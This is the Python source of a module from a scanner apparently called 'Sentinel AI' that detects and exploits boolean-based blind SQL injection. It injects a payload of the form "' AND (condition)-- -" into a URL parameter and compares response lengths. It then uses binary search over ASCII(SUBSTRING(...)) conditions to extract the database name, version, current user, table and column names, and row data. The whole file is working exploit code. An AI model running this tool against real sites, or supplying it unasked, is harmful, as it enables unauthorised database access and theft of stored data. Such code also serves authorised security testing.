"""
===========================================================
Project : Sentinel AI
Module  : Blind Boolean SQL Injection
File ID : SCANNER-BLIND-BOOLEAN-001
Version : 1.1.0
===========================================================

Description:
Boolean-Based Blind SQL Injection engine.
Detects and exploits Boolean Blind SQLi vulnerabilities.
"""

from __future__ import annotations

import logging
import time
from typing import Any

from app.modules.scanner.core.base_scanner import BaseScanner
from app.modules.scanner.modules.blind_payloads import BlindPayloadGenerator

logger = logging.getLogger(__name__)


class BlindBooleanScanner(BaseScanner):
    """
    Boolean-Based Blind SQL Injection scanner.
    """

    def __init__(self, target: str):
        super().__init__(target)
        self.payload_gen = BlindPayloadGenerator()
        self.dbms: str | None = None
        self.parameter: str = "category"
        self.true_payload: str | None = None
        self.false_payload: str | None = None
        self.baseline_response: Any | None = None
        self.true_response: Any | None = None
        self.false_response: Any | None = None
        self.is_boolean_vulnerable: bool = False
        self.max_retries: int = 3
        self.retry_delay: float = 1.0

        self.statistics = {
            "requests": 0,
            "successful": 0,
            "failed": 0,
            "characters_extracted": 0,
        }

    def detect(self) -> bool:
        """
        Detect if Boolean Blind SQL injection is possible.

        Returns:
            True if vulnerable, False otherwise
        """
        logger.info("[BlindBoolean] Detecting Boolean Blind SQLi...")

        # Step 1: Get baseline response
        self.baseline_response = self._send_request_with_retry("")
        if self.baseline_response is None:
            logger.info("[BlindBoolean] ❌ Baseline request failed")
            return False

        baseline_length = len(self.baseline_response.body)

        # Step 2: Test boolean payloads
        for (
            true_payload,
            false_payload,
        ) in self.payload_gen.get_boolean_detection_pairs():
            true_resp = self._send_request_with_retry(true_payload)
            false_resp = self._send_request_with_retry(false_payload)

            if true_resp is None or false_resp is None:
                continue

            true_len = len(true_resp.body)
            false_len = len(false_resp.body)

            # Multiple detection signals
            signals = 0

            # Signal 1: Length difference from baseline
            if abs(true_len - baseline_length) > 100:
                signals += 1
            if abs(false_len - baseline_length) < 50:
                signals += 1

            # Signal 2: Length difference between true and false
            if abs(true_len - false_len) > 100:
                signals += 1

            # Signal 3: Status code difference
            if true_resp.status_code != false_resp.status_code:
                signals += 1

            # Signal 4: Keyword presence
            true_body_lower = true_resp.body.lower()
            false_body_lower = false_resp.body.lower()

            if "error" in true_body_lower and "error" not in false_body_lower:
                signals += 1
            if "error" not in true_body_lower and "error" in false_body_lower:
                signals += 1

            if signals >= 2:
                self.true_payload = true_payload
                self.false_payload = false_payload
                self.true_response = true_resp
                self.false_response = false_resp
                self.is_boolean_vulnerable = True
                logger.info(
                    f"[BlindBoolean] ✅ Boolean Blind SQLi confirmed (signals: {signals})"
                )
                return True

        logger.info("[BlindBoolean] ❌ Boolean Blind SQLi not detected")
        return False

    def extract_database(self) -> str | None:
        """Extract database name using Boolean Blind SQLi."""
        if not self.is_boolean_vulnerable:
            return None

        logger.info("[BlindBoolean] Extracting database name...")
        query = self.payload_gen.get_boolean_database_query()
        result = self._extract_string(query)
        if result:
            logger.info(f"[BlindBoolean] ✅ Database: {result}")
        return result

    def extract_version(self) -> str | None:
        """Extract database version using Boolean Blind SQLi."""
        if not self.is_boolean_vulnerable:
            return None

        logger.info("[BlindBoolean] Extracting database version...")
        query = self.payload_gen.get_boolean_version_query()
        result = self._extract_string(query)
        if result:
            logger.info(f"[BlindBoolean] ✅ Version: {result}")
        return result

    def extract_user(self) -> str | None:
        """Extract current user using Boolean Blind SQLi."""
        if not self.is_boolean_vulnerable:
            return None

        logger.info("[BlindBoolean] Extracting current user...")
        query = self.payload_gen.get_boolean_user_query()
        result = self._extract_string(query)
        if result:
            logger.info(f"[BlindBoolean] ✅ User: {result}")
        return result

    def extract_tables(self) -> list[str]:
        """Extract table names using Boolean Blind SQLi."""
        if not self.is_boolean_vulnerable:
            return []

        logger.info("[BlindBoolean] Extracting tables...")

        # Get table count
        count_query = self.payload_gen.get_boolean_table_count_query()
        table_count = self._extract_integer(count_query)
        if table_count is None:
            table_count = 0

        logger.info(f"[BlindBoolean] ✅ Found {table_count} tables")

        tables = []
        for i in range(min(table_count, 50)):
            query = self.payload_gen.get_boolean_tables_query(i)
            table_name = self._extract_string(query)
            if table_name:
                tables.append(table_name)
                logger.info(f"[BlindBoolean]   Table {i + 1}: {table_name}")

        return tables

    def extract_columns(self, table: str) -> list[str]:
        """Extract column names from a table using Boolean Blind SQLi."""
        if not self.is_boolean_vulnerable:
            return []

        logger.info(f"[BlindBoolean] Extracting columns from {table}...")

        # Get column count
        count_query = self.payload_gen.get_boolean_column_count_query(table)
        column_count = self._extract_integer(count_query)
        if column_count is None:
            column_count = 0

        logger.info(f"[BlindBoolean]   Found {column_count} columns")

        columns = []
        for i in range(min(column_count, 30)):
            query = self.payload_gen.get_boolean_columns_query(table, i)
            column_name = self._extract_string(query)
            if column_name:
                columns.append(column_name)
                logger.info(f"[BlindBoolean]   Column {i + 1}: {column_name}")

        return columns

    def extract_data(self, table: str, column: str, limit: int = 100) -> list[str]:
        """Extract data from a table using Boolean Blind SQLi."""
        if not self.is_boolean_vulnerable:
            return []

        logger.info(f"[BlindBoolean] Extracting data from {table}.{column}...")

        data = []
        for i in range(limit):
            query = self.payload_gen.get_boolean_data_query(column, table, i)
            value = self._extract_string(query)
            if value:
                data.append(value)
                logger.info(f"[BlindBoolean]   Row {i + 1}: {value}")
            else:
                break

        return data

    def _extract_string(self, query: str) -> str | None:
        """
        Extract a string value using Boolean Blind SQLi.
        Uses binary search for efficient extraction.

        Args:
            query: SQL query to execute

        Returns:
            Extracted string or None
        """
        if not self.true_payload or not self.false_payload:
            return None

        result = ""

        # First determine length using binary search
        max_len = 256
        min_len = 1
        length = 0  # <--- FIXED: Initialize to 0

        while min_len <= max_len:
            mid = (min_len + max_len) // 2
            test_query = f"LENGTH(({query})) > {mid}"
            payload = self._build_boolean_payload(test_query, self.true_payload)

            if self._send_request_with_check(payload):
                min_len = mid + 1
                length = mid
            else:
                max_len = mid - 1

        logger.debug(f"[BlindBoolean]   String length: {length}")

        if length == 0:
            return ""

        # Extract each character using binary search
        for pos in range(1, length + 1):
            char = self._extract_char_at_position(query, pos)
            if char:
                result += char
                self.statistics["characters_extracted"] += 1

                if len(result) % 5 == 0:
                    logger.info(f"[BlindBoolean]   Extracted: {result}")

        return result

    def _extract_char_at_position(self, query: str, position: int) -> str | None:
        """
        Extract a single character at a position using binary search.

        Args:
            query: SQL query
            position: Position (1-indexed)

        Returns:
            Character or None
        """
        # ASCII range for printable characters
        low = 32  # Space
        high = 126  # ~

        while low <= high:
            mid = (low + high) // 2
            test_query = f"ASCII(SUBSTRING(({query}), {position}, 1)) > {mid}"
            payload = self._build_boolean_payload(test_query, self.true_payload)

            if self._send_request_with_check(payload):
                low = mid + 1
            else:
                high = mid - 1

        if low <= 126:
            return chr(low)

        return None

    def _extract_integer(self, query: str) -> int | None:
        """Extract an integer value using Boolean Blind SQLi."""
        if not self.true_payload or not self.false_payload:
            return None

        # Binary search for integer
        low = 0
        high = 1000000

        while low < high:
            mid = (low + high + 1) // 2
            test_query = f"({query}) > {mid}"
            payload = self._build_boolean_payload(test_query, self.true_payload)

            if self._send_request_with_check(payload):
                low = mid
            else:
                high = mid - 1

        return low

    def _build_boolean_payload(self, condition: str, base_payload: str) -> str:
        """Build a boolean payload with a condition."""
        return f"' AND ({condition})-- -"

    def _send_request(self, payload: str):
        """Send a request with payload."""
        self.statistics["requests"] += 1
        try:
            if "?" in self.target:
                base_url = self.target.split("?")[0]
                existing_params = (
                    self.target.split("?")[1] if "?" in self.target else ""
                )
                if existing_params:
                    url = f"{base_url}?{existing_params}&{self.parameter}={payload}"
                else:
                    url = f"{base_url}?{self.parameter}={payload}"
            else:
                url = f"{self.target}?{self.parameter}={payload}"

            response = self.request.send(
                method="GET",
                url=url,
            )

            if response:
                self.statistics["successful"] += 1
            else:
                self.statistics["failed"] += 1

            return response

        except Exception as e:
            self.statistics["failed"] += 1
            logger.debug(f"[BlindBoolean] Request failed: {e}")
            return None

    def _send_request_with_retry(self, payload: str) -> Any | None:
        """Send request with retry logic."""
        for attempt in range(self.max_retries):
            response = self._send_request(payload)
            if response is not None:
                return response
            if attempt < self.max_retries - 1:
                time.sleep(self.retry_delay * (attempt + 1))
        return None

    def _send_request_with_check(self, payload: str) -> bool:
        """Send a request and check if it matches the TRUE response."""
        response = self._send_request_with_retry(payload)

        if response is None:
            return False

        true_len = len(self.true_response.body) if self.true_response else 0
        current_len = len(response.body)
        baseline_len = len(self.baseline_response.body) if self.baseline_response else 0

        diff_true = abs(current_len - true_len)
        diff_false = abs(current_len - baseline_len)

        return diff_true < diff_false
